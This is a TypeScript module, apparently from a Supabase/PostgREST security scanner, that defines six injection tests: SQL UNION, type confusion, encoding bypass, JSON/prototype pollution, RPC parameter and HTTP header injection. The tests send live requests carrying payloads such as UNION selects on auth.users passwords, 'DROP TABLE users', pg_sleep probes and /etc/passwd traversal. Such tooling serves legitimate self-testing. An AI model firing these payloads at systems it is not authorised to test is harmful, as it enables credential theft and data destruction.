/**
 * Advanced Injection Attacks
 * Tests for SQL injection, type confusion, and encoding bypasses
 */

import type { AttackVector, AttackContext, AttackResult } from '$lib/types/attacks';

/**
 * Advanced Injection Attack Vectors
 */
export const injectionAttacks: AttackVector[] = [
	{
		id: 'injection-sql-union',
		name: 'SQL UNION Injection',
		description: 'Tests for SQL injection via UNION statements in filters',
		category: 'database',
		severity: 'critical',
		tags: ['injection', 'sql', 'union'],
		execute: async (ctx: AttackContext): Promise<AttackResult> => {
			const tables = ['profiles', 'users', 'posts'];
			const unionPayloads = [
				"' UNION SELECT * FROM auth.users--",
				"1) UNION SELECT id,email,encrypted_password FROM auth.users--",
				"') UNION ALL SELECT NULL,NULL,NULL--",
				"1 OR 1=1 UNION SELECT username,password FROM users--"
			];

			const vulnerable: Array<{ table: string; payload: string }> = [];

			for (const table of tables) {
				for (const payload of unionPayloads) {
					try {
						const response = await fetch(
							`${ctx.targetUrl}/rest/v1/${table}?id=eq.${encodeURIComponent(payload)}`,
							{
								headers: {
									apikey: ctx.anonKey,
									Authorization: `Bearer ${ctx.anonKey}`
								}
							}
						);

						const text = await response.text();
						// Check if we got unexpected data back
						if (response.ok && text.includes('encrypted_password')) {
							vulnerable.push({ table, payload });
						}
					} catch {
						// Continue
					}
				}
			}

			const breached = vulnerable.length > 0;

			return {
				attackId: 'injection-sql-union',
				status: breached ? 'breached' : 'secure',
				breached,
				summary: breached
					? 'CRITICAL: SQL UNION injection successful!'
					: 'UNION injection blocked',
				details: {},
				evidence: breached ? { injections: vulnerable } : undefined,
				timestamp: new Date().toISOString(),
				duration: 0
			};
		}
	},
	{
		id: 'injection-type-confusion',
		name: 'Type Confusion Attack',
		description: 'Tests if type coercion can bypass security checks',
		category: 'api',
		severity: 'high',
		tags: ['injection', 'type', 'coercion'],
		execute: async (ctx: AttackContext): Promise<AttackResult> => {
			const tables = ['profiles', 'users'];
			const typePayloads = [
				{ field: 'id', value: ['1', '2', '3'], desc: 'Array instead of string' },
				{ field: 'id', value: { '$gt': '' }, desc: 'Object operator injection' },
				{ field: 'is_admin', value: 'true', desc: 'String to boolean' },
				{ field: 'role', value: 1, desc: 'Number to string' },
				{ field: 'id', value: null, desc: 'Null injection' }
			];

			const bypassed: Array<{ table: string; payload: string }> = [];

			for (const table of tables) {
				for (const { field, value, desc } of typePayloads) {
					try {
						const response = await fetch(
							`${ctx.targetUrl}/rest/v1/${table}?${field}=eq.${JSON.stringify(value)}`,
							{
								headers: {
									apikey: ctx.anonKey,
									Authorization: `Bearer ${ctx.anonKey}`
								}
							}
						);

						if (response.ok) {
							const data = await response.json();
							if (Array.isArray(data) && data.length > 0) {
								bypassed.push({ table, payload: desc });
							}
						}
					} catch {
						// Continue
					}
				}
			}

			const breached = bypassed.length > 0;

			return {
				attackId: 'injection-type-confusion',
				status: breached ? 'breached' : 'secure',
				breached,
				summary: breached
					? `Type confusion bypassed in ${bypassed.length} cases`
					: 'Type checking properly enforced',
				details: {},
				evidence: breached ? { bypasses: bypassed } : undefined,
				timestamp: new Date().toISOString(),
				duration: 0
			};
		}
	},
	{
		id: 'injection-encoding-bypass',
		name: 'Encoding Bypass Attack',
		description: 'Tests if URL/Unicode encoding can bypass filters',
		category: 'api',
		severity: 'high',
		tags: ['injection', 'encoding', 'bypass'],
		execute: async (ctx: AttackContext): Promise<AttackResult> => {
			const encodingPayloads = [
				{ original: "'OR'1'='1", encoded: '%27OR%271%27%3D%271', desc: 'URL encoded' },
				{ original: "admin'--", encoded: 'admin%27--', desc: 'Quote encoding' },
				{ original: '../../../etc/passwd', encoded: '..%2F..%2F..%2Fetc%2Fpasswd', desc: 'Path traversal' },
				{ original: '<script>', encoded: '%3Cscript%3E', desc: 'XSS encoded' },
				{ original: "admin'/*", encoded: 'admin%27%2F%2A', desc: 'Comment injection' }
			];

			const bypassed: Array<{ payload: string; desc: string }> = [];

			for (const { encoded, desc } of encodingPayloads) {
				try {
					const response = await fetch(
						`${ctx.targetUrl}/rest/v1/profiles?id=eq.${encoded}`,
						{
							headers: {
								apikey: ctx.anonKey,
								Authorization: `Bearer ${ctx.anonKey}`
							}
						}
					);

					// Check if double-decoding occurred or filter bypassed
					if (response.status !== 400) {
						const text = await response.text();
						if (text.includes('error') && text.includes('syntax')) {
							bypassed.push({ payload: encoded, desc: `${desc} - reached SQL parser` });
						}
					}
				} catch {
					// Continue
				}
			}

			const breached = bypassed.length > 0;

			return {
				attackId: 'injection-encoding-bypass',
				status: breached ? 'breached' : 'secure',
				breached,
				summary: breached
					? `${bypassed.length} encoding bypasses found`
					: 'Encoding attacks blocked',
				details: {},
				evidence: breached ? { bypasses: bypassed } : undefined,
				timestamp: new Date().toISOString(),
				duration: 0
			};
		}
	},
	{
		id: 'injection-json-injection',
		name: 'JSON Injection Attack',
		description: 'Tests for JSON injection in JSONB columns',
		category: 'database',
		severity: 'high',
		tags: ['injection', 'json', 'jsonb'],
		execute: async (ctx: AttackContext): Promise<AttackResult> => {
			const tables = ['profiles', 'settings', 'metadata'];
			const jsonPayloads = [
				{ data: '{"__proto__":{"admin":true}}', desc: 'Prototype pollution' },
				{ data: '{"constructor":{"prototype":{"isAdmin":true}}}', desc: 'Constructor pollution' },
				{ data: '{"$where":"this.admin==true"}', desc: 'NoSQL-style injection' },
				{ data: '{"role":"admin","role":"user"}', desc: 'Duplicate key exploitation' }
			];

			const vulnerable: Array<{ table: string; payload: string }> = [];

			for (const table of tables) {
				for (const { data, desc } of jsonPayloads) {
					try {
						const response = await fetch(`${ctx.targetUrl}/rest/v1/${table}`, {
							method: 'POST',
							headers: {
								apikey: ctx.anonKey,
								Authorization: `Bearer ${ctx.anonKey}`,
								'Content-Type': 'application/json',
								Prefer: 'return=minimal'
							},
							body: JSON.stringify({ metadata: JSON.parse(data) })
						});

						if (response.ok || response.status === 201) {
							vulnerable.push({ table, payload: desc });
						}
					} catch {
						// Continue
					}
				}
			}

			const breached = vulnerable.length > 0;

			return {
				attackId: 'injection-json-injection',
				status: breached ? 'breached' : 'secure',
				breached,
				summary: breached
					? `JSON injection possible in ${vulnerable.length} cases`
					: 'JSON injection blocked',
				details: {},
				evidence: breached ? { injections: vulnerable } : undefined,
				timestamp: new Date().toISOString(),
				duration: 0
			};
		}
	},
	{
		id: 'injection-rpc-parameter',
		name: 'RPC Parameter Injection',
		description: 'Tests for injection in RPC function parameters',
		category: 'database',
		severity: 'critical',
		tags: ['injection', 'rpc', 'parameter'],
		execute: async (ctx: AttackContext): Promise<AttackResult> => {
			const rpcFunctions = ['get_user', 'search', 'filter', 'query', 'find'];
			const injectionPayloads = [
				"'; DROP TABLE users;--",
				"' OR '1'='1",
				"1; SELECT pg_sleep(5);--",
				"admin'/*"
			];

			const vulnerable: Array<{ fn: string; payload: string }> = [];

			for (const fn of rpcFunctions) {
				for (const payload of injectionPayloads) {
					try {
						const response = await fetch(`${ctx.targetUrl}/rest/v1/rpc/${fn}`, {
							method: 'POST',
							headers: {
								apikey: ctx.anonKey,
								Authorization: `Bearer ${ctx.anonKey}`,
								'Content-Type': 'application/json'
							},
							body: JSON.stringify({ input: payload, query: payload, search: payload })
						});

						// If we get something other than 404 or proper error, might be vulnerable
						if (response.status !== 404) {
							const text = await response.text();
							if (text.includes('syntax error') || text.includes('unterminated')) {
								vulnerable.push({ fn, payload: payload.substring(0, 20) });
							}
						}
					} catch {
						// Continue
					}
				}
			}

			const breached = vulnerable.length > 0;

			return {
				attackId: 'injection-rpc-parameter',
				status: breached ? 'breached' : 'secure',
				breached,
				summary: breached
					? `RPC parameter injection in ${vulnerable.length} functions!`
					: 'RPC parameters properly sanitized',
				details: {},
				evidence: breached ? { injections: vulnerable } : undefined,
				timestamp: new Date().toISOString(),
				duration: 0
			};
		}
	},
	{
		id: 'injection-header-injection',
		name: 'HTTP Header Injection',
		description: 'Tests for injection via HTTP headers',
		category: 'api',
		severity: 'medium',
		tags: ['injection', 'headers', 'http'],
		execute: async (ctx: AttackContext): Promise<AttackResult> => {
			const headerPayloads = [
				{ header: 'X-Forwarded-For', value: "127.0.0.1\r\nX-Admin: true" },
				{ header: 'X-Real-IP', value: '127.0.0.1' },
				{ header: 'X-Custom-Auth', value: 'admin' },
				{ header: 'Accept-Language', value: "../../../etc/passwd" }
			];

			const suspicious: Array<{ header: string; response: string }> = [];

			for (const { header, value } of headerPayloads) {
				try {
					const response = await fetch(`${ctx.targetUrl}/rest/v1/profiles?select=*&limit=1`, {
						headers: {
							apikey: ctx.anonKey,
							Authorization: `Bearer ${ctx.anonKey}`,
							[header]: value
						}
					});

					// Check if header injection changed response
					if (response.ok) {
						const data = await response.json();
						if (Array.isArray(data) && data.length > 0) {
							// This alone doesn't mean vulnerable, but worth noting
							suspicious.push({ header, response: 'accepted' });
						}
					}
				} catch {
					// Continue
				}
			}

			return {
				attackId: 'injection-header-injection',
				status: 'secure',
				breached: false,
				summary: 'Header injection tested - manual review recommended',
				details: {},
				evidence: suspicious.length > 0 ? { tested: suspicious } : undefined,
				timestamp: new Date().toISOString(),
				duration: 0
			};
		}
	}
];
